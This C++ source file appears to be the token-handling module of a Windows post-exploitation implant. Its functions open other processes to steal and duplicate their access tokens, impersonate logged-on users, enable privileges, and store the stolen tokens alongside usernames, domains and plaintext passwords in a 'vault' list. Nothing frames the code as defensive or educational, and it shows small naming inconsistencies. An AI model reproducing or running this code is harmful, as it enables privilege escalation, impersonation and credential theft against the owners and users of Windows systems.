#include "commands/include/tokens.hpp"
namespace Token {

	BOOL RevertToken() {

		HANDLE token = { };
		if (NT_SUCCESS(ntstatus = Ctx->nt.NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &token, sizeof(HANDLE)))) {
			return TRUE;
		}

		return FALSE;
	}

	BOOL Tokenimpersonate(bool impersonate) {

		BOOL success = FALSE;
		if (impersonate && !Ctx->tokens.impersonate && Ctx->tokens.token) {
			if (!(Ctx->tokens.impersonate = Ctx->win32.ImpersonateLoggedOnUser(Ctx->tokens.token->handle))) {
				return_defer(ERROR_CANNOT_IMPERSONATE);
			}
		} else if (!impersonate && Ctx->tokens.impersonate) {
			Ctx->tokens.impersonate = FALSE;
			success = RevertToken();

		} else if (impersonate && !Ctx->tokens.token) {
			success = TRUE;
		} else if (impersonate && Ctx->tokens.impersonate) {
			success = TRUE;
		} else if (impersonate && !Ctx->tokens.impersonate) {
			success = TRUE;
		}

		defer:
		return success;
	}

	VOID DuplicateToken(HANDLE orgToken, const uint32_t access, SECURITY_IMPERSONATION_LEVEL level, TOKEN_TYPE type, PHANDLE new_token) {

		OBJECT_ATTRIBUTES attrs				= { };
		SECURITY_QUALITY_OF_SERVICE sqos	= { };

		sqos.Length				    = sizeof(SECURITY_QUALITY_OF_SERVICE);
		sqos.ImpersonationLevel     = level;
		sqos.ContextTrackingMode	= 0;
		sqos.EffectiveOnly			= FALSE;

		InitializeObjectAttributes(&attrs, nullptr, 0, nullptr, nullptr);
		attrs.SecurityQualityOfService = &sqos;

		ntstatus = Ctx->nt.NtDuplicateToken(orgToken, access, &attrs, FALSE, type, new_token);
	}

	VOID SetTokenPrivilege(const wchar_t* privilege, bool enable) {

		TOKEN_PRIVILEGES token_priv	= { };
		HANDLE token 				= { };
		LUID luid 					= { };

		if (!LookupPrivilegeValueW(nullptr, privilege, &luid)) {
			return_defer(ERROR_PRIVILEGE_NOT_HELD);
		}

		token_priv.PrivilegeCount		= 1;
		token_priv.Privileges[0].Luid	= luid;

		enable
		? token_priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
		: token_priv.Privileges[0].Attributes = NULL;

		if (
			!NT_SUCCESS(Ctx->nt.NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &token)) ||
			!Ctx->win32.AdjustTokenPrivileges(token, FALSE, &token_priv, 0, nullptr, nullptr)) {
			return_defer(ERROR_INVALID_TOKEN);
		}

		defer:
	}

	HANDLE StealProcessToken(HANDLE target, const uint32_t pid) {

		HANDLE hProcess		= { };
		HANDLE hDuplicate	= { };

		if (!NT_SUCCESS(Process::NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, pid))) {
			return_defer(ntstatus);
		}

		if (target) {
			if (!NT_SUCCESS(ntstatus = Ctx->nt.NtDuplicateObject(hProcess, target, NtCurrentProcess(), &hDuplicate, 0, 0, DUPLICATE_SAME_ACCESS))) {
				return_defer(ntstatus);
			}
		} else {
			if (!NT_SUCCESS(ntstatus = Ctx->nt.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hDuplicate))) {
				return_defer(ntstatus);
			}
		}

		defer:
		if (hProcess) {
			Ctx->nt.NtClose(hProcess);
		}

		return hDuplicate;
	}

	_token_list_data* GetToken(const uint32_t tokenId) {

		_token_list_data *head = Ctx->tokens.vault;
		uint32_t index = 0;

		for ( ;index < tokenId && head && head->Next; ++index) {
			head = head->Next;
		}
		if (index != tokenId) {
			return nullptr;
		}

		return head;
	}

	DWORD AddToken(HANDLE token, wchar_t* const username, const int16_t type, const uint32_t pid, wchar_t* const domain_user, wchar_t* const domain, wchar_t* const password) {

		_token_list_data *head	= { };
		_token_list_data *entry	= { };
		DWORD Index				= 0;

		entry = (_token_list_data*) x_malloc(sizeof(_token_list_data));

		entry->handle		= token;
		entry->username		= username;
		entry->pid			= pid;
		entry->type			= type;
		entry->domain_user	= domain_user;
		entry->domain		= domain;
		entry->password		= password;
		entry->Next			= nullptr;

		if (Ctx->tokens.vault == nullptr) {
			Ctx->tokens.vault = entry;
			return Index;
		}

		head = Ctx->tokens.vault;
		while (head->Next) {
			head = head->Next;
			Index++;
		}

		head->Next = entry;
		Index++;

		return Index;
	}

	BOOL RemoveToken(const uint32_t token_id) {

		_token_list_data *head	= Ctx->tokens.vault;
		_token_list_data *entry	= GetToken(token_id);
		_token_list_data *prev	= { };

		if (!entry) {
			return FALSE;
		}

		while (head) {
			if (head == entry) {
				if (head == Ctx->tokens.vault) {
					Ctx->tokens.vault = entry->Next;

				} else {
					prev = Ctx->tokens.vault;
					while (prev && prev->Next != entry) {
						prev = prev->Next;
					}
					if (prev) {
						prev->Next = entry->Next;
					}
				}

				if (Ctx->tokens.impersonate && Ctx->tokens.token->handle == entry->handle) {
					TokenImpersonate(FALSE);
				}

				if (entry->handle) {
					Ctx->nt.NtClose(entry->handle);
					entry->handle = nullptr;
				}

				if (entry->domain_user) {
					x_memset(entry->domain_user, 0, x_wcslen(entry->domain_user) * sizeof(wchar_t));
					x_free(entry->domain_user);
					entry->domain_user = nullptr;
				}

				if (entry->username) {
					x_memset(entry->username, 0, x_wcslen(entry->username) * sizeof(wchar_t));
					x_free(entry->username);
					entry->username = nullptr;
				}

				if (entry->domain) {
					x_memset(entry->domain, 0, x_wcslen(entry->domain) * sizeof(wchar_t));
					x_free(entry->domain);
					entry->domain = nullptr;
				}

				if (entry->password) {
					x_memset(entry->password, 0, x_wcslen(entry->password) * sizeof(wchar_t));
					x_free(entry->password);
					entry->password = nullptr;
				}

				x_memset(entry, 0, sizeof(_token_list_data));

				x_free(entry);
				return TRUE;
			}

			head = head->Next;
		}

		return FALSE;
	}
}
